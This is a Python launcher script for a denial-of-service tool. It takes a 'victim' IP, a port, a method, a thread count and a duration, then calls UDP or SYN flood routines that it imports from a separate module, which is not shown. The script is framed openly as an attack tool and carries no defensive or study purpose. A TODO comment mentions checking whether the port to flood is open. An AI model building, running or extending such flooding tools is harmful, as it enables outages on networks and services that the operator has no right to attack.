import optparse, asyncio

from os import system
from sys import version,stdout
from socket import gethostbyaddr

try:
    from savitr.zeus import udp_strike, syn_strike
except ImportError:
    stdout.write("\n[!!]\tWas unable to import 'zeus.py' from directory 'shiva/savitr'")
    raise SystemExit


#sudo python3 main.py -v 127.0.0.1 -d 80 -m UDP -t 60 -p 3

usage = """\n\n

Example: -v 127.0.0.1 -d 80 -m udp -t 10 -p 6 -s .4  (Does not need to be in order)

Options: (everything but victim has a default value if not given one)
 ________________________________________________________________
|                                                                |
|-v, --victim      | The IP address.                             |
|-d, --destination | The targeted Port number.                   |
|-m, --method      | The attack Method.                          |
|-p, --processes   | The Thread count.                           |
|-t, --time        | The attack Time length in second(s).        |
|-s, --sleep       | The time between each packet in second(s).  |
|________________________________________________________________|
 """

parser = optparse.OptionParser(description="User options", usage=usage)
parser.add_option(

        '-v',
        '--victim',
        action='store',
        dest='harg',
        type=str,
        help='The host IP address.'
    )
parser.add_option(

        '-d',
        '--destination',
        action='store',
        dest='darg',
        type=int,
        default=80,
        help='The host Port number.'
    )
parser.add_option(

        '-m',
        '--method',
        action='store',
        dest='marg',
        type=str,
        default='udp',
        help='The attack Method.'
    )
parser.add_option(

        '-p',
        '--processes',
        action='store',
        dest='parg',
        type=int,
        default=3,
        help='The Thread count.'
    )
parser.add_option(

        '-t',
        '--time',
        action='store',
        dest='targ',
        type=int,
        default=5,
        help='The attack Time.'
    )

parser.add_option(

    '-s',
    '--sleep',
    action='store',
    dest='sarg',
    type=float,
    default=.4,
    help='time between each packet sent in second(s).'
)


try:
    (options, args) = parser.parse_args()
except optparse.OptParseError as e:

    stdout.write('\n[!!]\tUnable to parse arguments.')
    raise SystemExit

ARGUMENT_DIC = {

    'victim/IP address': options.harg,
    'destination/Port': options.darg,
    'method/UDP,SYN': options.marg,
    'threads': options.parg, #  -p/--processes
    'time/Seconds': options.targ,
    'sleep': options.sarg
}

VERSION = {

    'required': [3,5,0,'3.5.0'],
    'user_version': version[0:6],
}


usr_opt = """\n\n
REVIEW: Option(s) not given a value are defaulted

Victim  | {victim/IP address} // {}
_______________________________

Port    | {destination/Port}
_______________________________

Method  | {method/UDP,SYN}
_______________________________

Threads | {threads}
_______________________________

Time    | {time/Seconds}
_______________________________

Sleep   | {sleep}
""".format(gethostbyaddr(ARGUMENT_DIC['victim/IP address']), **ARGUMENT_DIC)


#   TODO // Add a method that checks if the host is online and that the desired port to flood is open.


def check_compatability():
    'checks if user machine has proper file(s) to run this script.'

    if VERSION['required'][0] < 3 and VERSION['required'][1] < 5:

        print ("\n[!!]\tMissing required Python version!\n"
               "*\tMust have version {required[3]}+\n"
               "*\tYou have version {user_version}".format(**VERSION)); raise SystemExit



def main():

    stdout.write(usr_opt); input("\nPRESS ENTER TO CONTINUE. (Ctrl+z to exit)")

    if ARGUMENT_DIC['method/UDP,SYN'] == 'udp'.casefold():

        loop = asyncio.get_event_loop()
        loop.run_until_complete(udp_strike(**ARGUMENT_DIC))
        loop.close()

    elif ARGUMENT_DIC['method/UDP,SYN'] == 'syn'.casefold():

        loop = asyncio.get_event_loop()
        loop.run_until_complete(syn_strike(**ARGUMENT_DIC))
        loop.close()




if __name__ == '__main__':
    'execute'

    check_compatability()
    system("clear");main()

